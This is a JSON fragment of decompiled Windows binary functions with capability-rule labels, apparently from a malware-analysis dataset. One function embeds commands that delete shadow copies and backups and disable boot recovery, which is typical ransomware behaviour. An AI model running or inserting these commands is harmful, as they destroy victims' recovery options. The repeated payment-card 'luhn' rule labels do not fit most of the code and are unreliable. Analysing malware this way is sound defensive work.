        "decompiled_code": "\nint32_t fcn.0041c060(int32_t param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_8h;\n    uint arg_ch;\n    uint arg_10h;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    int32_t iVar7;\n    int32_t arg_10h_00;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471ac0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    piVar1 = fcn.004072d0();\n    iVar2 = (var_8h - *piVar1) / 0x18;\n    uVar3 = fcn.00404960();\n    iVar4 = fcn.00409190();\n    iVar5 = fcn.00409150();\n    if (iVar4 == iVar5) {\n        fcn.00408ff0();\n    }\n    arg_8h = fcn.004090a0(iVar4 + 1);\n    iVar5 = fcn.004091c0(arg_8h);\n    var_4h = 0;\n    arg_ch = fcn.00401440(iVar2 * 0x18 + iVar5);\n    arg_10h = fcn.00401440(var_ch_2);\n    fcn.0041c030(uVar3, arg_ch, arg_10h);\n    piVar1 = fcn.00404940();\n    if (var_8h == *piVar1) {\n        iVar7 = iVar5;\n        puVar6 = fcn.00404940();\n        uVar3 = *puVar6;\n        puVar6 = fcn.004072d0();\n        fcn.004090f0(*puVar6, uVar3, iVar7);\n    }\n    else {\n        iVar7 = var_8h;\n        arg_10h_00 = iVar5;\n        puVar6 = fcn.004072d0();\n        fcn.00409120(*puVar6, iVar7, arg_10h_00);\n        iVar7 = iVar5 + 0x18 + iVar2 * 0x18;\n        puVar6 = fcn.00404940();\n        fcn.00409120(var_8h, *puVar6, iVar7);\n    }\n    var_4h = 0xffffffff;\n    fcn.00409000(iVar5, iVar4 + 1, arg_8h);\n    piVar1 = fcn.004072d0();\n    iVar4 = *piVar1;\n    *in_FS_OFFSET = var_ch_3;\n    return iVar2 * 0x18 + iVar4;\n}\n",
        "token_count": 753
    },
    "0041c280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c280(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470428;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00408270(arg_10h);\n    var_4h = 0;\n    fcn.00406400(arg_10h, uVar1);\n    arg_ch_00 = fcn.00401440(arg_ch);\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00410e30(arg_8h_00, arg_ch_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 260
    },
    "0041c420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ach\n\nvoid __cdecl fcn.0041c420(int32_t arg_8h)\n\n{\n    uint *arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_01;\n    char16_t *pcVar1;\n    uint var_ach;\n    uint var_94h;\n    uint var_7ch;\n    uint var_64h;\n    uint var_4ch;\n    uint var_34h;\n    uint var_1ch;\n    int32_t var_18h;\n    uchar var_14h;\n    uchar var_13h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x471ae0;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_13h = 0;\n    var_14h = 0;\n    var_10h = arg_8h_00;\n    for (var_18h = 0; var_18h < arg_8h; var_18h = var_18h + 1) {\n        pcVar1 = L\"vssadmin.exe Delete Shadows /All /Quiet\";\n        fcn.00405090(L\"vssadmin.exe Delete Shadows /All /Quiet\");\n        arg_8h_01 = &var_34h;\n        fcn.0040b360(arg_8h_01);\n        fcn.00404f30(arg_8h_01, pcVar1, arg_8h_00);\n        fcn.00405090(L\"bcdedit.exe /set {default} recoveryenabled No\");\n        fcn.0040b360(&var_4ch);\n        fcn.00404f30();\n        fcn.00405090(L\"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\");\n        fcn.0040b360(&var_64h);\n        fcn.00404f30();\n        fcn.00405090(L\"wbadmin DELETE SYSTEMSTATEBACKUP\");\n        fcn.0040b360(&var_7ch);\n        fcn.00404f30();\n        fcn.00405090(L\"wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest\");\n        fcn.0040b360(&var_94h);\n        fcn.00404f30();\n        fcn.00405090(L\"wmic.exe SHADOWCOPY /nointeractive\");\n        arg_8h_00 = &var_ach;\n        fcn.0040b360(arg_8h_00);\n        fcn.00404f30();\n        fcn.0041c580();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(var_ach);\n    return;\n}\n",
        "token_count": 664
    },
    "0041cc80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cc80(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    \n    arg_ch_00 = 2;\n    arg_8h_00 = fcn.00426bab(arg_8h, arg_ch, arg_10h);\n    fcn.0041cc50(arg_8h_00, arg_ch_00);\n    return;\n}\n",
        "token_count": 105
    },
    "0041cd70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041cd70(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint arg_ch;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_ch = 1;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041d3e0(arg_8h_00, arg_ch);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 175
    },
    "0041cdd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041cdd0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041d3c0(arg_8h_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 161
    },
    "0041ce60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ce60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint arg_18h;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff94;\n    uint var_58h;\n    uint var_4ch;\n    code *var_44h;\n    uint var_40h;\n    code *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470640;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    cVar1 = fcn.00404d10(var_10h);\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00401440(arg_8h);\n        cVar1 = fcn.0041d0c0(uVar2);\n        if (cVar1 == '\\0') {\n            fcn.0041d070();\n            fcn.0040eb60(arg_8h);\n            var_38h = arg_ch;\n            var_3ch = fcn.0040a250;\n            var_40h = arg_10h;\n            var_44h = fcn.0040dc80;\n            uVar2 = fcn.0041d650(&var_58h, &var_3ch, &var_38h, 0x48246f, 0x48246e);\n            arg_18h = fcn.00401440(arg_8h);\n            in_stack_ffffff94 = fcn.0041d6a0(&var_4ch, 1, &var_44h, &var_40h, arg_18h, uVar2);\n            fcn.0041cdd0(in_stack_ffffff94);\n            fcn.00415400();\n            uVar2 = fcn.00401440(&var_30h);\n            fcn.0041cf80(uVar2);\n            fcn.0041d0a0();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_ffffff94);\n    return;\n}\n",
        "token_count": 562
    },
    "0041cf80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cf80(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.00404990();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00401440(arg_8h);\n        puVar3 = fcn.00404940(uVar2);\n        fcn.0041d7d0(*puVar3);\n    }\n    else {\n        uVar2 = fcn.00401440(arg_8h);\n        fcn.0041cfe0(uVar2);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0041cfe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0041cfe0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint noname_0;\n    int32_t *piVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    puVar2 = fcn.00404940();\n    uVar3 = fcn.00401440(*puVar2);\n    noname_0 = fcn.00404960();\n    fcn.0041d7a0(noname_0, uVar3, uVar1);\n    puVar2 = fcn.00404940();\n    uVar1 = *puVar2;\n    puVar2 = fcn.00404940(uVar1);\n    uVar3 = *puVar2;\n    fcn.00404980(uVar3);\n    puVar2 = fcn.00404940();\n    piVar4 = fcn.00404940(uVar3, uVar1, *puVar2);\n    *piVar4 = *piVar4 + 0x20;\n    return;\n}\n",
        "token_count": 282
    },
    "0041d070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041d070(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00405100();\n    fcn.0041cd30();\n    return param_1;\n}\n",
        "token_count": 49
    },
    "0041d0c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041d0c0(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffffa4;\n    uint var_44h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_15h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x471b40;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0041d0c0::var_ch;\n    var_15h._0_1_ = 0;\n    cVar1 = fcn.00404d10(var_10h);\n    if (cVar1 == '\\0') {\n        fcn.00401b10(4);\n        fcn.0041d9b0(&fcn.0041d0c0::var_15h + 1, var_1ch);\n        while( true ) {\n            in_stack_ffffffa4 = 0x41d133;\n            uVar2 = fcn.0041d9d0(&fcn.0041d0c0::var_34h, var_1ch);\n            cVar1 = fcn.0041d230(uVar2);\n            if (cVar1 == '\\0') break;\n            uVar2 = fcn.0041cc30(&fcn.0041d0c0::var_44h, 1);\n            fcn.0041d290();\n            iVar3 = fcn.0041d9f0(uVar2);\n            if (iVar3 == 0) {\n                var_28h = stack0xffffffe8;\n                in_stack_ffffffa4 = stack0xffffffe8;\n                fcn.0041d2f0(&fcn.0041d0c0::var_38h, stack0xffffffe8);\n                cVar1 = fcn.0041d2b0();\n                if (cVar1 != '\\0') break;\n                puVar4 = fcn.0041d9b0(&fcn.0041d0c0::var_3ch, var_1ch);\n                unique0x00007a00 = *puVar4;\n            }\n            fcn.0041d270();\n        }\n        var_24h = var_1ch;\n        var_20h = fcn.0040e9d0();\n        var_2ch = fcn.0040e4e0();\n        for (; var_20h != var_2ch; var_20h = var_20h + 0x20) {\n            var_30h = var_20h;\n            cVar1 = fcn.0040cdc0(var_20h, arg_8h);\n            if (cVar1 != '\\0') {\n                var_15h._0_1_ = 1;\n                break;\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_ffffffa4);\n    return;\n}\n",
        "token_count": 803
    },
    "0041d290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0041d290(uint param_1)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.00406250(param_1);\n    fcn.0040e910(arg_8h);\n    return;\n}\n",
        "token_count": 81
    },
    "0041d2f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d2f0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint noname_0;\n    int32_t arg_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h = arg_ch;\n    puVar1 = fcn.00404940();\n    fcn.0041da30(arg_ch + 0x20, *puVar1, arg_10h);\n    piVar2 = fcn.00404940();\n    uVar3 = fcn.00401440(*piVar2 + -0x20);\n    noname_0 = fcn.00404960();\n    fcn.0041da70(noname_0, uVar3);\n    piVar2 = fcn.00404940();\n    *piVar2 = *piVar2 + -0x20;\n    uVar3 = fcn.00404960();\n    uVar3 = fcn.00401440(uVar3);\n    fcn.004073d0(arg_ch, uVar3);\n    return arg_8h;\n}\n",
        "token_count": 267
    },
    "0041d4b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0041d4b0(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = *param_1 + 0x20;\n    return param_1;\n}\n",
        "token_count": 56
    },
    "0041d5b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d5b0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_10h;\n    uint var_4h;\n    \n    arg_10h = fcn.00404960();\n    fcn.0041da80(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 77
    },
    "0041d650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d650(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint arg_14h_00;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    \n    arg_14h_00 = fcn.00401440(arg_18h);\n    arg_10h_00 = fcn.00401440(arg_14h);\n    arg_ch_00 = fcn.00401440(arg_10h);\n    arg_8h_00 = fcn.00401440(arg_ch);\n    fcn.0041dbe0(arg_8h_00, arg_ch_00, arg_10h_00, arg_14h_00);\n    return arg_8h;\n}\n",
        "token_count": 189
    },
    "0041d6a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041d6a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint32_t arg_8h_01;\n    int32_t *in_FS_OFFSET;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint8_t var_1dh;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471b80;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00401b10(0xc);\n    uVar1 = fcn.00401440(arg_1ch);\n    arg_10h_00 = fcn.00401440(arg_18h);\n    arg_ch_00 = fcn.00401440(arg_14h);\n    arg_8h_00 = fcn.00401440(arg_10h);\n    uVar1 = fcn.0041db90(arg_8h_00, arg_ch_00, arg_10h_00, uVar1);\n    var_4h = 0;\n    uVar1 = fcn.0041ded0(arg_ch, uVar1);\n    fcn.004159e0(uVar1);\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    fcn.0041dab0();\n    arg_8h_01 = var_1dh;\n    uVar1 = fcn.00415980();\n    fcn.004153e0(uVar1);\n    var_4h = 0xffffffff;\n    fcn.00415400();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_01);\n    return;\n}\n",
        "token_count": 495
    },
    "0041d7a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d7a0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    fcn.00401300(0x20, arg_ch);\n    arg_8h = fcn.00401440(arg_10h);\n    fcn.0041dad0(arg_8h);\n    return;\n}\n",
        "token_count": 94
    },
    "0041d9f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d9f0(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_4h;\n    \n    cVar1 = fcn.004168b0();\n    if (cVar1 == '\\0') {\n        arg_8h_00 = fcn.00415240(&var_ch, 4);\n        fcn.00426c72(arg_8h_00);\n    }\n    fcn.0041e040(arg_8h);\n    return;\n}\n",
        "token_count": 127
    },
    "0041da30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0041da30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.00409f20(&arg_8h, &arg_10h);\n    fcn.0041e140(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 97
    },
    "0041da80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0041da80(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.0041e180(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 77
    },
    "0041dad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041dad0(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00405010(arg_8h);\n    fcn.0041cd70(arg_8h + 0x18);\n    return in_ECX;\n}\n",
        "token_count": 71
    },
    "0041db70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0041db70(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040cf10(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "0041dbe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041dbe0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_18h;\n    uint arg_14h_00;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_18h = fcn.00401440(arg_14h);\n    arg_14h_00 = fcn.00401440(arg_10h);\n    arg_10h_00 = fcn.00401440(arg_ch);\n    arg_ch_00 = fcn.00401440(arg_8h);\n    fcn.0041e220(var_1h, arg_ch_00, arg_10h_00, arg_14h_00, arg_18h);\n    return in_ECX;\n}\n",
        "token_count": 227
    },
    "0041dd60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041dd60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_14h;\n    uint var_4h;\n    \n    arg_14h = fcn.00404960();\n    fcn.0041e280(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 86
    },
    "0041dd90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041dd90(void)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404960();\n    var_8h = fcn.0041de90(uVar1);\n    var_ch = fcn.004012f0();\n    puVar2 = fcn.00407940(&var_ch, &var_8h);\n    return *puVar2;\n}\n",
        "token_count": 115
    },
    "0041de60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041de60(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0041e320(arg_8h);\n    fcn.00408d10(arg_8h_00);\n    return;\n}\n",
        "token_count": 74
    },
    "0041dea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041dea0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_14h;\n    uint var_4h;\n    \n    arg_14h = fcn.00404960();\n    fcn.0041e280(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 86
    },
    "0041e040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e040(uint arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t *arg_8h_00;\n    uint arg_8h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471bd8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_01 = 8;\n    var_10h = uVar2;\n    fcn.00401b10(8);\n    arg_8h_00 = in_ECX + 5;\n    fcn.00416710(arg_8h_00);\n    var_4h = 0;\n    cVar1 = (**(*in_ECX + 0xc))(arg_8h_00, arg_8h_01, uVar2);\n    if (cVar1 == '\\0') {\n        puVar3 = fcn.00402eb0(in_ECX);\n        cVar1 = fcn.0041e570(&var_18h, arg_8h, *puVar3);\n        if (cVar1 == '\\0') {\n            var_4h = 0xffffffff;\n            fcn.004166c0();\n        }\n        else {\n            var_4h = 0xffffffff;\n            fcn.004166c0();\n        }\n    }\n    else {\n        var_4h = 0xffffffff;\n        fcn.004166c0();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_01);\n    return;\n}\n",
        "token_count": 479
    },
    "0041e140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041e140(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x20) {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.0041e350(arg_8h_00);\n        arg_10h = arg_10h + 0x20;\n    }\n    return arg_10h;\n}\n",
        "token_count": 133
    },
    "0041e180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e180(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    \n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x20) {\n        arg_ch_00 = fcn.00401440(arg_8h);\n        fcn.0041da70(arg_10h, arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0041e1c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041e1c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_18h;\n    uint arg_14h_00;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_18h = fcn.00401440(arg_14h);\n    arg_14h_00 = fcn.00401440(arg_10h);\n    arg_10h_00 = fcn.00401440(arg_ch);\n    arg_ch_00 = fcn.00401440(arg_8h);\n    fcn.0041e5f0(0, arg_ch_00, arg_10h_00, arg_14h_00, arg_18h);\n    return in_ECX;\n}\n",
        "token_count": 219
    },
    "0041e220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041e220(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint arg_8h;\n    uint *in_ECX;\n    uint var_4h;\n    \n    puVar1 = fcn.00401440(arg_ch);\n    *in_ECX = *puVar1;\n    arg_10h_00 = fcn.00401440(arg_18h);\n    arg_ch_00 = fcn.00401440(arg_14h);\n    arg_8h = fcn.00401440(arg_10h);\n    fcn.0041e690(arg_8h, arg_ch_00, arg_10h_00);\n    return in_ECX;\n}\n",
        "token_count": 196
    },
    "0041e280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e280(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint extraout_ECX;\n    uint arg_8h_00;\n    uint var_14h;\n    uchar var_eh;\n    uchar var_dh;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_ch = fcn.00401440(arg_8h);\n    uVar1 = fcn.00401440(arg_ch);\n    var_8h = fcn.00401440(arg_10h);\n    var_dh = fcn.00409f20(&var_ch, &var_8h);\n    arg_8h_00 = extraout_ECX;\n    fcn.00409fe0(&var_eh);\n    uVar1 = fcn.0041e6e0(var_ch, uVar1, var_8h, arg_14h);\n    fcn.00409ff0(&arg_10h, uVar1);\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 280
    },
    "0041e350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
